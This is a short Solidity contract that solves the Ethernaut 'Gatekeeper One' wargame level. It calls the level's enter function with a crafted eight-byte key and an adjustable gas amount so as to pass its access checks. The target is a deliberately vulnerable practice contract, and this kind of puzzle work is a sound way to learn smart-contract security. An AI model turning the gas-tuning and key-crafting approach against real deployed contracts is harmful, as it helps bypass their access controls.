// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne public ethernautInstance;

    constructor(address instanceAddress) {
        ethernautInstance = IGatekeeperOne(instanceAddress);
    }

    function attack(bytes8 key, uint256 gasAmount) public {
        ethernautInstance.enter{gas: 81910 + gasAmount}(key);
    }

}